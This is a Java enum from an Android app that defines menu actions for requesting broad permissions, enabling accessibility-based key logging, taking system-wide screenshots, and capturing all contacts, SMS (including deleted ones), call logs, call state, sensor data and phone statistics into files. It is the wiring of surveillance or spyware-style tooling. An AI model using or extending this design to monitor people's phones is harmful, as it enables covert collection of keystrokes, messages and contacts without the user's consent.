package com.vikasyadavnsit.cdc.enums;

import android.app.Activity;

import com.vikasyadavnsit.cdc.permissions.PermissionManager;
import com.vikasyadavnsit.cdc.services.CDCSensorService;
import com.vikasyadavnsit.cdc.services.ScreenshotService;
import com.vikasyadavnsit.cdc.utils.ActionUtils;
import com.vikasyadavnsit.cdc.utils.CallUtils;
import com.vikasyadavnsit.cdc.utils.FileUtils;
import com.vikasyadavnsit.cdc.utils.KeyLoggerUtils;
import com.vikasyadavnsit.cdc.utils.MessageUtils;

import java.util.function.Consumer;

import lombok.AllArgsConstructor;
import lombok.Getter;

@Getter
@AllArgsConstructor
public enum ClickActions {

    REQUEST_ALL_PERMISSION(
            1,
            input -> {
                new PermissionManager().requestAllPermissions((Activity) input);
            },
            "Request all permissions in a single stroke (It will take permissions one by one until you take action on all)",
            "Request all permissions"
    ),
    RESET_ALL_PERMISSION(
            2,
            input -> {
                new PermissionManager().resetAllPermissionManually((Activity) input);
            },
            "Reset all permissions manually (It will open settings tab to manually remove all permissions)",
            "Reset all permissions"
    ),
    REQUEST_EXACT_ALARM_PERMISSION(
            3,
            input -> {
                // Mysterious observation is that :
                // If multiple setting intents are called all of them will open up in parallel window in background.
                ActionUtils.requestExactAlarmPermission();
            },
            "Request exact alarm permission (It will open setting tab to choose precision alarm permission)",
            "Request alarm permission"
    ),
    REQUEST_ACCESSIBILITY_PERMISSION(
            4,
            input -> {
                KeyLoggerUtils.startAccessibilitySettingIntent((Activity) input);
            },
            "Request accessibility permission for key logging (It will open accessibility setting tab to enable key logging)",
            "Request accessibility permission"
    ),
    REQUEST_FILE_ACCESS_PERMISSION(
            5,
            input -> {
                FileUtils.startFileAccessSettings((Activity) input);
            },
            "Request file access permission (It will open file setting tab to enable file access)",
            "Request file access permission"
    ),
    START_SENSOR_SERVICE(
            6,
            input -> {
                CDCSensorService.startSensorService((Activity) input);
                CDCSensorService.stopSensorService((Activity) input);
            },
            "Start/Stop sensor service (It is a toggle button to start/stop capturing multiple sensors data)",
            "Start sensor service"
    ),
    START_SCREENSHOT_SERVICE(
            7,
            input -> {
                ActionUtils.startMediaProjectionService((Activity) input);
                ScreenshotService.setTakeScreenshot(true);
                ScreenshotService.setStopScreenshotService(true);
            },
            "Start/Stop screenshot service (It is a toggle button to capture a screenshot on the entire system)",
            "Start screenshot service"
    ),
    CAPTURE_ALL_CONTACTS(
            8,
            input -> {
                FileUtils.appendDataToFile(FileMap.CONTACTS, MessageUtils.getMessages((Activity) input, FileMap.CONTACTS));
            },
            "Capture all phone contacts (It will capture all the phone contacts)",
            "Capture contacts"
    ),
    CAPTURE_ALL_SMS(
            9,
            input -> {
                FileUtils.appendDataToFile(FileMap.SMS, MessageUtils.getMessages((Activity) input, FileMap.SMS));
            },
            "Capture all SMS (It will capture all the SMS sent, received, deleted, archived)",
            "Capture SMS"
    ),
    CAPTURE_ALL_CALL_LOGS(
            10,
            input -> {
                FileUtils.appendDataToFile(FileMap.CALL, MessageUtils.getMessages((Activity) input, FileMap.CALL));
            },
            "Capture all call logs (It will capture all call logs)",
            "Capture call"
    ),
    MONITOR_CALL_STATE(
            11,
            input -> {
                CallUtils.monitorCallState((Activity) input);
            },
            "Monitor call state (Incoming, ringing, outgoing, conference)",
            "Monitor call state"
    ),
    MONITOR_PHONE_STATISTICS(
            12,
            input -> {
                ActionUtils.registerPhoneStatistics((Activity) input);
            },
            "Monitor phone statistics (It will capture all the phone statistics like button presses, screen on/off, and user present)",
            "Monitor phone statistics"
    );

    int order;
    Consumer<Object> consumer;
    String description;
    String actionLabel;

}
